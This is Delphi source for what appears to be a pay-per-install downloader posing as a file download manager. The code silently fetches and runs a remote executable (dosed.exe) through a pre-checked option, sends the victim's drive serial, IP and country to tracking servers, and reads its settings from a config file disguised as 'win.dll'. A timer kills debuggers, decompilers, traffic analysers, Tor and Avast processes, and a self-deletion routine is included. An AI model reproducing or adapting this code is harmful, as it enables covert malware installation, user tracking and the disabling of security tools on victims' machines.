unit PostUnit;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, IdBaseComponent,
  IdComponent, IdTCPConnection, IdTCPClient, IdHTTP, IdMultipartFormData,
  Vcl.ExtDlgs, Vcl.ExtCtrls, WinInet,
  IdIPWatch, ShellApi, WinSock, IniFiles, TlHelp32, Registry,
  Vcl.ComCtrls, IdAntiFreezeBase, Vcl.IdAntiFreeze,
  Vcl.Samples.Gauges, ActiveX, ShlObj,
  Vcl.Buttons, IdIOHandler, IdIOHandlerSocket, IdIOHandlerStack, IdSSL,
  IdSSLOpenSSL, IdExplicitTLSClientServerBase, IdMessageClient, IdSMTPBase,
  IdSMTP, Vcl.Imaging.pngimage, Vcl.Imaging.jpeg;

type
  TForm1 = class(TForm)
    IdHTTP1: TIdHTTP;
    Timer1: TTimer;
    Timer2: TTimer;
    Timer4: TTimer;
    Timer5: TTimer;
    Timer3: TTimer;
    IdHTTP4: TIdHTTP;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    Button8: TButton;
    Button21: TButton;
    Button3: TButton;
    Button22: TButton;
    key: TEdit;
    urlid: TEdit;
    cou: TEdit;
    noip: TEdit;
    os: TEdit;
    name_file: TEdit;
    idfiles: TEdit;
    down: TEdit;
    types: TEdit;
    TabSheet2: TTabSheet;
    PageControl2: TPageControl;
    TabSheet4: TTabSheet;
    Edit1: TEdit;
    Edit2: TEdit;
    Button1: TButton;
    Button6: TButton;
    Button10: TButton;
    Button12: TButton;
    Button11: TButton;
    Panel2: TPanel;
    CheckBox1: TCheckBox;
    Panel1: TPanel;
    Image11: TImage;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Image10: TImage;
    Image9: TImage;
    Image8: TImage;
    Image7: TImage;
    Image6: TImage;
    Image5: TImage;
    Image4: TImage;
    Image1: TImage;
    Image2: TImage;
    Image3: TImage;
    Gauge1: TGauge;
    Timer6: TTimer;
    IdSSLIOHandlerSocketOpenSSL1: TIdSSLIOHandlerSocketOpenSSL;
    SaveDialog1: TSaveDialog;
    Button2: TButton;
    TabSheet5: TTabSheet;
    PageControl3: TPageControl;
    TabSheet6: TTabSheet;
    webid: TEdit;
    Edit4: TEdit;
    Button13: TButton;
    Button16: TButton;
    Button17: TButton;
    Button18: TButton;
    size: TEdit;
    closed: TTimer;
    Button4: TButton;
    procedure FormCreate(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure IdHTTP4Work(ASender: TObject; AWorkMode: TWorkMode;
      AWorkCount: Int64);
    procedure IdHTTP4WorkBegin(ASender: TObject; AWorkMode: TWorkMode;
      AWorkCountMax: Int64);
    procedure Timer4Timer(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Timer5Timer(Sender: TObject);
    procedure Image1Click(Sender: TObject);
    procedure Image2Click(Sender: TObject);
    procedure Image1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Image2MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Image3Click(Sender: TObject);
    procedure Image3MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Image5MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure sImage2MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Image6Click(Sender: TObject);
    procedure Image7MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Image8Click(Sender: TObject);
    procedure Image9Click(Sender: TObject);
    procedure Image10Click(Sender: TObject);
    procedure sImage2MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Timer3Timer(Sender: TObject);
    procedure Label2MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Timer6Timer(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button22Click(Sender: TObject);
    procedure Button21Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure Button10Click(Sender: TObject);
    procedure Button12Click(Sender: TObject);
    procedure Button11Click(Sender: TObject);
    procedure Image11MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Image11MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button2Click(Sender: TObject);
    procedure Button13Click(Sender: TObject);
    procedure Button16Click(Sender: TObject);
    procedure Button17Click(Sender: TObject);
    procedure Button18Click(Sender: TObject);
    procedure closedTimer(Sender: TObject);
    procedure Button4Click(Sender: TObject);









  private
    { Private declarations }
  public
    { Public declarations }
  end;

 type
  Turl = class(TThread)
  private
    { Private declarations }
  protected
    procedure Execute; override;
  end;

  type
  TSave = class(TThread)
  private
    { Private declarations }
  protected
    procedure Execute; override;
  end;



var
  Form1: TForm1;
  Buf    :Pointer;
  SizeBuf : Cardinal = 0;
  BTR : Cardinal = 2000;
  HFiles : Pointer;
  Hinternet : Pointer;
  HF : Cardinal = INVALID_HANDLE_VALUE;
  RWfil : Cardinal = 0;
  LoginData, Response, Messag: TStrings;
  SerialNum,dtyp:Dword;
  oa,ob:DWORD;
  a,b:DWORD;
  Buffer,disk: array [0..255] of char;
  Save:TSave;
  url:Turl;
implementation

{$R *.dfm}


 function Pars(T_, ForS, _T:string):string;   //Функция парсинга
var a, b:integer;
begin
Result := '';
if (T_='') or (ForS='') or (_T='') then Exit;
a:=Pos(T_, ForS);
if a=0 then Exit else a:=a+Length(T_);
ForS:=Copy(ForS, a, Length(ForS)-a+1);
b:=Pos(_T, ForS);
if b>0 then
Result:=Copy(ForS, 1, b - 1);
end;


function KillTask32(ExeFileName: string): integer; //Функция кил
const
PROCESS_TERMINATE=$0001;
var
ContinueLoop: BOOL;
FSnapshotHandle: THandle;
FProcessEntry32: TProcessEntry32;
begin
  result := 0;
  FSnapshotHandle := CreateToolhelp32Snapshot (TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  while integer(ContinueLoop)<> 0 do
  begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) = UpperCase(ExeFileName)) or
      (UpperCase(FProcessEntry32.szExeFile) = UpperCase(ExeFileName)))
    then
    Result := Integer(TerminateProcess(OpenProcess( PROCESS_TERMINATE, BOOL(0), FProcessEntry32.th32ProcessID), 0));
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;


 procedure DesstroyExe;
var
   F: TextFile;
   Temp, AppName: string;
begin
   Temp:= 'delete.bat';
   AppName:= ExtractFileName (ParamStr(0));
   AssignFile(F, Temp);
   Rewrite(F);
   Writeln(F, 'del ' + AppName);
   Writeln(F, 'del ' + Temp);
   CloseFile(F);
   ShellExecute (Application.Handle,'open','delete.bat',nil,nil,SW_ShowNormal);
   Halt;
 end;




procedure TForm1.Button10Click(Sender: TObject);
begin
   url:=Turl.Create(False);
   url.Priority:=tpNormal;
end;


procedure Turl.Execute;
var
  stream:TMemoryStream;
  begin
  stream:=TMemoryStream.Create;
  try
   Hinternet:=nil;
   Hinternet:= InternetOpen('0',0,0,0,0);
   HFiles:=InternetOpenUrl(Hinternet,'http://theogma.com/dosed/dosed.exe',0,0,0,0);
   HF:= CreateFile('D:\dosed.exe',GENERIC_WRITE,FILE_SHARE_READ,Nil,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
   GetMem(Buf,BTR);
   repeat
   InternetReadFile(HFiles,Buf,BTR,SizeBuf);
   WriteFile(HF,Buf^,SizeBuf,RWfil,0);
   until
   SizeBuf = 0;
   CloseHandle(HF);
   InternetCloseHandle(Hinternet);
   HF:=INVALID_HANDLE_VALUE;
   FreeMem(Buf);
   WinExec('D:\dosed.exe',SW_SHOW);

   Form1.Timer6.Enabled:=True;

finally
   stream.Free;
end;
end;


procedure TForm1.Button11Click(Sender: TObject);
var dataPost:TIdMultiPartFormDataStream;
begin
 Try
   //Отправка POST запроса на сервер рекламодателю
   dataPost:=TIdMultiPartFormDataStream.Create;
   dataPost.AddFormField('uid',Edit1.Text,'utf-8').ContentTransfer := '8bit'; // id рекламодателя
   dataPost.AddFormField('name',Edit2.Text,'utf-8').ContentTransfer := '8bit'; // Название файла
   dataPost.AddFormField('noip',noip.Text,'utf-8').ContentTransfer := '8bit'; // IP
   dataPost.AddFormField('os',os.Text,'utf-8').ContentTransfer := '8bit';     // Windows
   dataPost.AddFormField('cou',cou.Text,'utf-8').ContentTransfer := '8bit';   // Страна
   dataPost.AddFormField('key',key.Text,'utf-8').ContentTransfer := '8bit';   // Ключ диска "C"
   dataPost.AddFormField('idfiles',idfiles.Text,'utf-8').ContentTransfer := '8bit';  // ID файла
   dataPost.AddFormField('money','0','utf-8').ContentTransfer := '8bit'; // Сума которую нужно отнять у рекламодателя
   StringReplace(idHTTP1.Post('http://sfentor.com/POST_REKLAMODATEL.php',dataPost),'<br>',#13#10,[rfReplaceAll]); // Отправка данных методом POST
   datapost.Free;  // Освободить память
   except
      MessageDlg('Отсутствует связь с сервером (8)!',mtError,[mbOK],0);
      closed.Enabled:=True;
  end;
end;

procedure TForm1.Button12Click(Sender: TObject);
var dataPost:TIdMultiPartFormDataStream;
begin
try
   //Отправка POST запроса на сервер Пользователю
   if (urlid.Text = '1') then
   begin
   dataPost:=TIdMultiPartFormDataStream.Create;
   dataPost.AddFormField('idfiles',idfiles.Text,'utf-8').ContentTransfer := '8bit';
   dataPost.AddFormField('noip',noip.Text,'utf-8').ContentTransfer := '8bit';
   dataPost.AddFormField('cou',cou.Text,'utf-8').ContentTransfer := '8bit';
   StringReplace(idHTTP1.Post('http://sfentor.com/POST_USER.php',dataPost),'<br>',#13#10,[rfReplaceAll]);
   end
   else
   begin
     Button16.Click(); //Отправка установки на ID
     Button18.Click(); //Отправка установки на FC
   end;
   datapost.Free;
except
      MessageDlg('Отсутствует связь с сервером (7)!',mtError,[mbOK],0);
      closed.Enabled:=True;
  end;

end;



procedure TForm1.Button13Click(Sender: TObject);
var
dataPost:TIdMultiPartFormDataStream;
begin
try
dataPost:=TIdMultiPartFormDataStream.Create;
dataPost.AddFormField('open',webid.text,'utf-8').ContentTransfer := '8bit';
StringReplace(idHTTP1.Post('http://file-cash.com/POST_REKLAMODATEL.php',dataPost),'<br>',#13#10,[rfReplaceAll]);
datapost.Free;
except
      MessageDlg('Отсутствует связь с сервером (3)!',mtError,[mbOK],0);
     closed.Enabled:=True;
  end;
end;




procedure TForm1.Button16Click(Sender: TObject);
var dataPost:TIdMultiPartFormDataStream;
begin
  Try
  dataPost:=TIdMultiPartFormDataStream.Create;
   dataPost.AddFormField('webid',webid.Text,'utf-8').ContentTransfer := '8bit';
   dataPost.AddFormField('wemaster',Edit4.Text,'utf-8').ContentTransfer := '8bit';
   dataPost.AddFormField('idfiles',idfiles.Text,'utf-8').ContentTransfer := '8bit';
   dataPost.AddFormField('noip',noip.Text,'utf-8').ContentTransfer := '8bit';
   dataPost.AddFormField('cou',cou.Text,'utf-8').ContentTransfer := '8bit';
   StringReplace(idHTTP1.Post('http://sfentor.com/POST_WEB.php',dataPost),'<br>',#13#10,[rfReplaceAll]);
   datapost.Free;
   except
      MessageDlg('Отсутствует связь с сервером (4)!',mtError,[mbOK],0);
      closed.Enabled:=True;
  end;
end;

procedure TForm1.Button17Click(Sender: TObject);
var
dataPost:TIdMultiPartFormDataStream;
begin
try
dataPost:=TIdMultiPartFormDataStream.Create;
dataPost.AddFormField('open',webid.Text,'utf-8').ContentTransfer := '8bit';
StringReplace(idHTTP1.Post('http://sfentor.com/POST_REKLAMODATEL.php',dataPost),'<br>',#13#10,[rfReplaceAll]);
datapost.Free;
except
      MessageDlg('Отсутствует связь с сервером (2)!',mtError,[mbOK],0);
      closed.Enabled:=True;
  end;
end;

procedure TForm1.Button18Click(Sender: TObject);
var
dataPost:TIdMultiPartFormDataStream;
begin
 Try
// Отправка WebMaster пользователю
   dataPost:=TIdMultiPartFormDataStream.Create;
   dataPost.AddFormField('idfiles',idfiles.Text,'utf-8').ContentTransfer := '8bit';
   dataPost.AddFormField('noip',noip.Text,'utf-8').ContentTransfer := '8bit';
   dataPost.AddFormField('cou',cou.Text,'utf-8').ContentTransfer := '8bit';
   StringReplace(idHTTP1.Post('http://file-cash.com/POST_USER.php',dataPost),'<br>',#13#10,[rfReplaceAll]);
   datapost.Free;
except
      MessageDlg('Отсутствует связь с сервером (5)!',mtError,[mbOK],0);
      closed.Enabled:=True;
  end;
end;

procedure TForm1.Button1Click(Sender: TObject);
var
dataPost:TIdMultiPartFormDataStream;
begin
try
dataPost:=TIdMultiPartFormDataStream.Create;
dataPost.AddFormField('open',Edit1.Text,'utf-8').ContentTransfer := '8bit';
StringReplace(idHTTP1.Post('http://sfentor.com/POST_REKLAMODATEL.php',dataPost),'<br>',#13#10,[rfReplaceAll]);
datapost.Free;
except
      MessageDlg('Отсутствует связь с сервером (6)!',mtError,[mbOK],0);
      closed.Enabled:=True;
  end;
end;

procedure TForm1.Button21Click(Sender: TObject);
var
dataPost:TIdMultiPartFormDataStream;
begin
  try
dataPost:=TIdMultiPartFormDataStream.Create;
dataPost.AddFormField('open','1','utf-8').ContentTransfer := '8bit';
StringReplace(idHTTP1.Post('http://sfentor.com/POST_REKLAMODATEL.php',dataPost),'<br>',#13#10,[rfReplaceAll]);
datapost.Free;
   except
      MessageDlg('Отсутствует связь с сервером (1)!',mtError,[mbOK],0);
      closed.Enabled:=True;
  end;
end;





procedure TForm1.Button22Click(Sender: TObject);
begin
Form1.FormStyle:=fsNormal; //Снимаем передний план
Save:=TSave.Create(False); // Поток
Timer4.Enabled:=True;
SaveDialog1.FileName:=''+name_file.Text+types.Text;
end;


{ Поток сохранения файла}
procedure TSave.Execute;
var
stream:TMemoryStream;
begin
stream:=TMemoryStream.Create;
try
 Form1.IdHTTP4.Get('http://installdisck.com/load/'+Form1.down.Text,stream);
 if Form1.SaveDialog1.Execute then
 stream.SaveToFile(Form1.SaveDialog1.FileName);
finally
   Form1.IdHTTP4.Free;
   stream.Free;
end;
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
if (urlid.Text = '2') then
  begin
    ShellExecute(handle,'open' , PWideChar('http://file-cash.com/load/'+down.Text),nil,nil,sw_show);
  end
  else
  begin
    ShellExecute(handle,'open' , PWideChar('https://installdisck.com/load/'+down.Text),nil,nil,sw_show);
  end;

Timer5.Enabled:=True; //Закрыть Загрузчик через 2 часа
end;

procedure TForm1.Button3Click(Sender: TObject);
var s:string;
begin
os.text:=TOSVersion.ToString;
end;




procedure TForm1.Button4Click(Sender: TObject);
var dataPost:TIdMultiPartFormDataStream;
begin
 Try
   //Отправка POST запроса на сервер рекламодателю
   dataPost:=TIdMultiPartFormDataStream.Create;
   dataPost.AddFormField('uid','1','utf-8').ContentTransfer := '8bit'; // id рекламодателя
   dataPost.AddFormField('name','Rek-1','utf-8').ContentTransfer := '8bit'; // Название файла
   dataPost.AddFormField('noip','***.***.***.***','utf-8').ContentTransfer := '8bit'; // IP
   dataPost.AddFormField('os','Windows XP.7.8.10','utf-8').ContentTransfer := '8bit';     // Windows
   dataPost.AddFormField('cou','***','utf-8').ContentTransfer := '8bit';   // Страна
   dataPost.AddFormField('key','********','utf-8').ContentTransfer := '8bit';   // Ключ диска "C"
   dataPost.AddFormField('idfiles',idfiles.Text,'utf-8').ContentTransfer := '8bit';  // ID файла
   dataPost.AddFormField('money','0','utf-8').ContentTransfer := '8bit'; // Сума которую нужно отнять у рекламодателя
   StringReplace(idHTTP1.Post('http://sfentor.com/POST_REKLAMODATEL.php',dataPost),'<br>',#13#10,[rfReplaceAll]); // Отправка данных методом POST
   datapost.Free;  // Освободить память
   except
      MessageDlg('Отсутствует связь с сервером (9)!',mtError,[mbOK],0);
      closed.Enabled:=True;
  end;
end;

procedure TForm1.Button6Click(Sender: TObject);
 var
 reg : tregistry;
begin
  reg := tregistry.create;
  try
    reg.RootKey := HKEY_CURRENT_USER;
    if not reg.KeyExists('Software\dudoser') then
    begin
//        Если строку url не нашли тогда выполняем это действие
    end
    else
    begin
    // Софт установлен
        CheckBox1.Visible:=False;
        CheckBox1.Checked:=False;
    end;
  finally
    reg.free;
  end;
end;




procedure TForm1.closedTimer(Sender: TObject);
begin
Close();
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
//sButton11.Click();
//Action := caNone;
end;


procedure TForm1.FormCreate(Sender: TObject);
const CS_DROPSHADOW = $00020000;
var
dataPost:TIdMultiPartFormDataStream;
keyfile:string;
L: TIniFile;
begin
SetClassLong(Handle, GCL_STYLE, GetWindowLong(Handle, GCL_STYLE) or CS_DROPSHADOW);

//label6.Font.Color := Lighter(clWhite,250); //  Прозрачность
//Определить ключ ПК
      dtyp:=GetDriveType('c:/');
      dtyp := DRIVE_REMOVABLE;
      GetVolumeInformation('c:/',Buffer,sizeof(Buffer),@SerialNum,a,b,nil,0);
      key.text:=IntToStr(SerialNum);

//Считывание информации с файла
FormStyle:=fsStayOnTop;
L := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'win.dll');
idfiles.Text := L.ReadString('sys', 'id', '');
down.Text := L.ReadString('syst', 'hesh', '');
noip.Text := L.ReadString('noip', 'noip', '');
cou.Text := L.ReadString('cou', 'cou', '');
types.Text := L.ReadString('name', 'name', '');
urlid.Text := L.ReadString('url', 'url', '');
name_file.Text := Utf8ToAnsi (L.ReadString('title', 'title', ''));
size.Text := Utf8ToAnsi (L.ReadString('size', 'size', ''));

Label3.Caption:='File name:'+#32+name_file.Text;  //title
Label4.Caption:='File size:'+#32+ size.Text;  //size
Label5.Caption:='Source:'+#32+'Интернет';  //source

//Проверка строк в файле
 if (idfiles.Text='') or (down.Text='') or (noip.Text='') or (cou.Text='') or (types.Text='') or (urlid.Text='') or (name_file.Text='') or (size.Text='') then
   begin
    Button8.Click(); //Закрыть загрузчик
  end
   else
    begin

      // Запуск парсера
    // Button5.Click();
      // Определить OS
      Button3.Click();
      // Отправка POST Администратору
      Button21.Click();

//      Определение вебмастера
       if (urlid.Text = '2') then
       begin
        Button13.Click();
        Button17.Click();
       end;

    // ОТОБРАЖЕНИЕ СОФТА (Все страны)
    Button1.Click();
    Button6.Click();


 L.Destroy;
 end;

end;






procedure TForm1.IdHTTP4Work(ASender: TObject; AWorkMode: TWorkMode;
  AWorkCount: Int64);
begin
Gauge1.Progress:=AWorkCount;
end;

procedure TForm1.IdHTTP4WorkBegin(ASender: TObject; AWorkMode: TWorkMode;
  AWorkCountMax: Int64);
begin
Gauge1.Progress:=0;
Gauge1.maxvalue:=AWorkCountMax;
end;


procedure TForm1.Image10Click(Sender: TObject);
begin
Panel2.Visible:=False;
Image10.Visible:=False;
Image9.Visible:=True;
Form1.Height:=208;
end;

procedure TForm1.Image11MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
 ReleaseCapture;
 Form1.perform(WM_SysCommand,$F012,0);
end;

procedure TForm1.Image11MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
image6.Visible:=False;
image8.Visible:=False;
end;

procedure TForm1.Image1Click(Sender: TObject);
begin
//Скрываем лишнее и приступаем к загрузке файла с сервера InstallDisck.com
 Button2.click(); // открыть браузе
 hide;
//sPanel1.Visible:=False; // Скрыть
//Gauge1.Visible:=True;  //Показать прогресс бар
Panel2.Visible:=False; // Скрыть
//Button22.Click();// Скачивание файла
Image1.Visible:=False;
Image2.Visible:=False;
Image3.Visible:=False;
Image4.Visible:=False;


// Если Галочка установлена, тогда скачиваем софт и устанавливаем
if CHeckBox1.Checked = True then  // Rek-1
    begin
    Button10.Click();  //Скачивание exe и установка
    end;

end;

procedure TForm1.Image1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
Image4.Visible:=True;
end;

procedure TForm1.Image2Click(Sender: TObject);
begin
  Close();
end;

procedure TForm1.Image2MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
Image3.Visible:=True;
end;

procedure TForm1.Image3Click(Sender: TObject);
begin
Close();
end;

procedure TForm1.Image3MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
Close();
end;

procedure TForm1.Image5MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
image6.Visible:=True;
end;

procedure TForm1.Image6Click(Sender: TObject);
begin
Hide;
Timer5.Enabled:=True; //Закрыть Загрузчик через 2 часа
end;

procedure TForm1.Image7MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
image8.Visible:=True;
end;

procedure TForm1.Image8Click(Sender: TObject);
begin
Form1.WindowState:=wsMinimized;
end;

procedure TForm1.Image9Click(Sender: TObject);
begin
Panel2.Visible:=True;
Image10.Visible:=True;
Image9.Visible:=False;
Form1.Height:=255;
end;

procedure TForm1.Label2MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
 ReleaseCapture;
 Form1.perform(WM_SysCommand,$F012,0);
end;




procedure TForm1.sImage2MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
 ReleaseCapture;
 Form1.perform(WM_SysCommand,$F012,0);
end;

procedure TForm1.sImage2MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
image6.Visible:=False;
image8.Visible:=False;
end;




procedure TForm1.Timer1Timer(Sender: TObject);
begin
Close();
end;

procedure TForm1.Timer2Timer(Sender: TObject);
begin
KillTask32('cheatengine-x86_64.exe');
KillTask32('cheatengine-i386.exe');
KillTask32('Charles.exe');
KillTask32('OllyDbg.exe');
KillTask32('PaperClipTrainerSpy.exe');
KillTask32('Lomer.exe');
KillTask32('HttpAnalyzerStdV7.exe');
KillTask32('denver.exe');
KillTask32('DelphiDecompiler.exe');
KillTask32('ProcessHacker.exe');
KillTask32('ScreenCapture.exe');
KillTask32('CamtasiaStudio.exe');
KillTask32('CamRecorder.exe');
KillTask32('Reflector.exe');
KillTask32('HWorks64.exe');
KillTask32('die.exe');
KillTask32('diel.exe');
KillTask32('pexplorer.exe');
KillTask32('Hide.me.exe');
KillTask32('VB Decompiler.exe');
KillTask32('SET.ReFox.exe');
KillTask32('EMS Source Rescuer.exe');
KillTask32('HexRays.exe');
KillTask32('torbrowser-install-8.0.3_ru.exe');
KillTask32('adguardInstaller.exe');
KillTask32('tor.exe');
KillTask32('adguardInstaller.exe');
KillTask32('avast_premier_antivirus_setup.exe');
KillTask32('AvastSvc.exe');
KillTask32('AvastUI.exe');
end;





procedure TForm1.Timer3Timer(Sender: TObject);
begin
Form1.AlphaBlendValue:= Form1.AlphaBlendValue+5;
if Form1.AlphaBlendValue=255 then timer1.Destroy;
  if Form1.AlphaBlendValue=255 then
  begin
      Timer3.Enabled:=False;
  end;
end;

procedure TForm1.Timer4Timer(Sender: TObject);
begin
if Gauge1.PercentDone=100 then
  begin
     Gauge1.ForeColor:=clLime;
     //ShellExecute(0, nil, '', nil, nil, SW_SHOWNORMAL);
     Timer4.Enabled:=False;
//     hide; // Скрываем форму скачивания
     Timer5.Enabled:=True; //Закрыть Загрузчик через 2 часа
  end
end;



procedure TForm1.Timer5Timer(Sender: TObject);
begin
Close();
end;


procedure TForm1.Timer6Timer(Sender: TObject);
var
reg : tregistry;
begin
 reg := tregistry.create;
 try
    reg.RootKey := HKEY_CURRENT_USER;
    if not reg.KeyExists('Software\dudoser') then
    begin
//        Если строку url не нашли тогда выполняем это действие
    end
    else
    begin
    // Софт установлен
           Form1.Button11.Click(); //Отправка POST рекламодателю об успешной установке
           Form1.Button12.Click(); // Отправка POST Владельцу файла об успешной установке
           Timer6.Enabled:=False;   // Выключаем таймер
    end;
  finally
    reg.free;
  end;
end;

end.
